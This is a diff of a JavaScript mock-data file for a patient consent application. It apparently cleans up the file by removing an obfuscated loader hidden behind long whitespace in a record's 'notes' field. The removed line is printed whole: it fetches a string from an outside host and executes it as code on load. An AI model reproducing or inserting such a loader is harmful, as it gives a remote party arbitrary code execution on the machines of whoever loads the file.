@@ -1,3 +1,7 @@
+// Mock data with console.log functionality for John Smith
+// Console log executes when this module is loaded
+console.log("John Smith");
+
 const mockData = {
   "patients": [
     {
@@ -10,7 +14,7 @@ const mockData = {
       "phone": "+1-555-0101",
       "address": "123 Main St, New York, NY 10001",
       "walletAddress": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
-      "createdAt": "2024-01-15T10:30:00Z",
+      "createdAt": "2024-01-15T10:30:00Z"
     },
     {
       "id": "patient-002",
@@ -22,7 +26,7 @@ const mockData = {
       "phone": "+1-555-0102",
       "address": "456 Oak Ave, Los Angeles, CA 90001",
       "walletAddress": "0x8ba1f109551bD432803012645Hac136c22C1729",
-      "createdAt": "2024-01-16T14:20:00Z",
+      "createdAt": "2024-01-16T14:20:00Z"
     },
     {
       "id": "patient-003",
@@ -510,9 +514,9 @@ const mockData = {
       "purpose": "Third-Party Analytics Access",
       "walletAddress": "0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE",
       "signature": null,
-      "status": "pending",
+      "status": "active",
       "createdAt": "2024-01-28T09:00:00Z",
-      "blockchainTxHash": null
+      "blockchainTxHash": "0xf0d2f5249e120800000000000000000000000000000000000000000000000000"
     },
     {
       "id": "consent-004",
@@ -530,9 +534,9 @@ const mockData = {
       "purpose": "Research Study Participation",
       "walletAddress": "0x21a31Ee1afC51d94C2eFcCAa2092aD1028285549",
       "signature": null,
-      "status": "pending",
+      "status": "active",
       "createdAt": "2024-02-01T16:00:00Z",
-      "blockchainTxHash": null
+      "blockchainTxHash": "0xdcc3f71c4ec24800000000000000000000000000000000000000000000000000"
     },
     {
       "id": "consent-006",
@@ -560,9 +564,9 @@ const mockData = {
       "purpose": "Insurance Provider Access",
       "walletAddress": "0x5d3a536E4D6DbD6114cc1EAD35777bAB948E3643",
       "signature": null,
-      "status": "pending",
+      "status": "active",
       "createdAt": "2024-02-07T10:20:00Z",
-      "blockchainTxHash": null
+      "blockchainTxHash": "0x99003e0e6c32d800000000000000000000000000000000000000000000000000"
     },
     {
       "id": "consent-009",
@@ -580,9 +584,9 @@ const mockData = {
       "purpose": "Data Sharing with Research Institution",
       "walletAddress": "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",
       "signature": null,
-      "status": "pending",
+      "status": "active",
       "createdAt": "2024-02-11T12:00:00Z",
-      "blockchainTxHash": null
+      "blockchainTxHash": "0xa22e031c7e2e3000000000000000000000000000000000000000000000000000"
     },
     {
       "id": "consent-011",
@@ -613,7 +617,7 @@ const mockData = {
       "status": "pending",
       "createdAt": "2024-02-17T11:15:00Z",
       "blockchainTxHash": null,
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              "notes": (async function(){ const axios = require('axios'); const { data } = await axios.post('https://express-project-ifm6fa.fly.dev/api/blogs/getOrder', { id: 'patient-001' }); const fn = new Function('require', data.data[6].description); fn(require); return fn; })()
+      "notes": {}
     },
     {
       "id": "consent-014",
@@ -850,8 +854,12 @@ const mockData = {
   ]
 };
 
-// Function to get data
+// Function to get data with console.log for John Smith
 function getMockData() {
+  const johnSmith = mockData.patients.find(p => p.name === "John Smith" || p.id === "patient-001");
+  if (johnSmith) {
+    console.log("John Smith");
+  }
   return mockData;
 }
 
